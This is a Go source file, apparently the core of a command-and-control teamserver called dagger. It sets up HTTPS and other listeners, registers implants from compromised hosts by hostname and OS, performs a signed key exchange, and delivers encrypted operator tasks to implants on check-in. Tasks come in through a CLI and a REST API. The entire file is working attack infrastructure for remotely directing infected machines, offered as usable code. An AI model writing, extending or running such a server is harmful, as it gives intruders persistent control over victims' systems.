package main

import (
	"crypto/ed25519"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime/debug"
	"syscall"
	"time"

	"github.com/fortress/v6/dagger/teamserver/listener"
	"github.com/fortress/v6/dagger/teamserver/operator"
	"gopkg.in/yaml.v3"
)

type TeamserverConfig struct {
	Listen struct {
		HTTPS     string `yaml:"https"`
		DNS       string `yaml:"dns"`
		WebSocket string `yaml:"websocket"`
		ICMP      bool   `yaml:"icmp"`
	} `yaml:"listen"`
	Operator struct {
		CLI string `yaml:"cli"`
		API    string `yaml:"api"`
		APIKey string `yaml:"api_key"`
	} `yaml:"operator"`
	TLS struct {
		CertFile string `yaml:"cert_file"`
		KeyFile  string `yaml:"key_file"`
	} `yaml:"tls"`
	KeyFile string `yaml:"key_file"`
}

func main() {
	configPath := flag.String("config", "teamserver.yaml", "path to config file")
	flag.Parse()

	cfg, err := loadConfig(*configPath)
	if err != nil {
		log.Fatalf("config: %v", err)
	}

	serverKeys, err := LoadOrGenerateKeys(cfg.KeyFile)
	if err != nil {
		log.Fatalf("keys: %v", err)
	}
	log.Printf("server public key: %s", hex.EncodeToString(serverKeys.Public[:]))

	// Initialize session and task management
	sm := NewSessionManager(serverKeys)
	tm := NewTaskManager()

	// Start HTTPS listener
	if cfg.Listen.HTTPS != "" {
		httpsListener := listener.NewHTTPSListener(cfg.Listen.HTTPS, cfg.TLS.CertFile, cfg.TLS.KeyFile,
			func(transport string, data []byte) ([]byte, error) {
				return handleImplantData(sm, tm, transport, data)
			})
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[https] panic: %v\nstack: %s", r, debug.Stack())
				}
			}()
			if err := httpsListener.Start(); err != nil {
				log.Printf("[https] %v", err)
			}
		}()
	}

	// Start operator CLI (if not daemonized)
	if cfg.Operator.CLI != "" {
		cli := operator.NewCLI(
			func() []string {
				sessions := sm.List()
				ids := make([]string, len(sessions))
				for i, s := range sessions {
					ids[i] = fmt.Sprintf("%x", s.ID)
				}
				return ids
			},
			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
				if timeout > 3600 {
					timeout = 3600 // max 1 hour
				}
				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
			},
		)
		go cli.Run()
	}

	// Start REST API
	if cfg.Operator.API != "" {
		apiKey := cfg.Operator.APIKey
		if apiKey == "" {
			apiKey = os.Getenv("DAGGER_API_KEY")
		}
		if apiKey == "" {
			log.Println("[api] WARNING: no api_key configured — API is open to any local process")
		}
		api := operator.NewAPI(cfg.Operator.API, apiKey,
			func() []string {
				sessions := sm.List()
				ids := make([]string, len(sessions))
				for i, s := range sessions {
					ids[i] = fmt.Sprintf("%x", s.ID)
				}
				return ids
			},
			func(sessionID string, taskType uint8, data []byte, timeout int) (interface{}, error) {
				if timeout > 3600 {
					timeout = 3600 // max 1 hour
				}
				return tm.Enqueue(sessionID, TaskType(taskType), data, time.Duration(timeout)*time.Second)
			},
		)
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[api] panic: %v\nstack: %s", r, debug.Stack())
				}
			}()
			if err := api.Start(); err != nil {
				log.Printf("[api] %v", err)
			}
		}()
	}

	log.Println("teamserver ready")

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	log.Println("teamserver shutting down")
}

// maxImplantDataSize is the maximum allowed JSON payload from an implant (64KB).
const maxImplantDataSize = 64 * 1024

// validSessionIDLen is the expected hex-encoded length of a 16-byte session ID.
const validSessionIDLen = 32

// handleImplantData processes incoming data from any transport
func handleImplantData(sm *SessionManager, tm *TaskManager, transport string, data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	if len(data) > maxImplantDataSize {
		return nil, fmt.Errorf("payload too large: %d bytes (max %d)", len(data), maxImplantDataSize)
	}

	// Parse message — register and checkin share fields
	type registerMsg struct {
		Op        string `json:"op"`
		Pubkey    string `json:"pubkey"`
		Hostname  string `json:"hostname"`
		OS        string `json:"os"`
		SessionID string `json:"session_id"` // required for checkin
	}
	var reg registerMsg
	if err := json.Unmarshal(data, &reg); err != nil {
		return nil, fmt.Errorf("parse: %w", err)
	}
	// Sanitize user-controlled strings for log safety (strips non-printable chars)
	reg.Hostname = sanitizeLogString(reg.Hostname)
	reg.OS = sanitizeLogString(reg.OS)
	// Default sanitized-empty fields to "unknown" so downstream code is safe
	if reg.Hostname == "" {
		reg.Hostname = "unknown"
	}
	if reg.OS == "" {
		reg.OS = "unknown"
	}

	switch reg.Op {
	case "register":
		pubkeyBytes, err := hex.DecodeString(reg.Pubkey)
		if err != nil {
			return nil, fmt.Errorf("decode pubkey: %w", err)
		}
		session, err := sm.Register(pubkeyBytes, reg.Hostname, reg.OS)
		if err != nil {
			return nil, fmt.Errorf("register: %w", err)
		}
		log.Printf("[%s] new implant: %x (%s/%s)", transport, session.ID, session.Hostname, session.OS)

		sessionIDHex := fmt.Sprintf("%x", session.ID)
		x25519PubHex := hex.EncodeToString(sm.keys.Public[:])
		ed25519PubHex := hex.EncodeToString(sm.keys.SignPublic[:])

		// Sign the handshake blob: (server_x25519_pubkey || session_id || server_ed25519_pubkey)
		sigBlob := make([]byte, 0, 32+len(sessionIDHex)+32)
		sigBlob = append(sigBlob, sm.keys.Public[:]...)
		sigBlob = append(sigBlob, sessionIDHex...)
		sigBlob = append(sigBlob, sm.keys.SignPublic[:]...)
		signature := ed25519.Sign(sm.keys.SignPrivate[:], sigBlob)

		resp := map[string]interface{}{
			"session_id":      sessionIDHex,
			"pubkey":          x25519PubHex,
			"ed25519_pubkey":  ed25519PubHex,
			"signature":       hex.EncodeToString(signature),
		}
		respBytes, err := json.Marshal(resp)
		if err != nil {
			return nil, fmt.Errorf("marshal response: %w", err)
		}
		return respBytes, nil

	case "checkin":
		if reg.SessionID == "" {
			return nil, fmt.Errorf("checkin requires session_id")
		}
		// Validate session_id is a valid hex string of correct length
		if !isValidSessionID(reg.SessionID) {
			return nil, fmt.Errorf("invalid session_id format")
		}
		session := sm.Get(reg.SessionID)
		if session == nil {
			return nil, fmt.Errorf("unknown session: %s", reg.SessionID)
		}
		session.Touch()
		task := tm.Dequeue(reg.SessionID)
		if task == nil {
			return []byte{}, nil // no tasks
		}
		encrypted, err := EncryptTask(task, &session.SessionKey)
		if err != nil {
			return nil, fmt.Errorf("encrypt task: %w", err)
		}
		return encrypted, nil

	default:
		return nil, fmt.Errorf("unknown op: %s", reg.Op)
	}
}

// sanitizeLogString strips non-printable characters and truncates to 256 bytes
func sanitizeLogString(s string) string {
	b := []byte(s)
	out := make([]byte, 0, len(b))
	for _, c := range b {
		if c >= 32 && c < 127 {
			out = append(out, c)
		}
	}
	if len(out) > 256 {
		out = out[:256]
	}
	return string(out)
}

// isValidSessionID returns true if s is exactly 32 hex characters.
func isValidSessionID(s string) bool {
	if len(s) != validSessionIDLen {
		return false
	}
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
			return false
		}
	}
	return true
}

func loadConfig(path string) (*TeamserverConfig, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("read config: %w", err)
	}
	cfg := &TeamserverConfig{}
	if err := yaml.Unmarshal(data, cfg); err != nil {
		return nil, fmt.Errorf("parse config: %w", err)
	}
	return cfg, nil
}
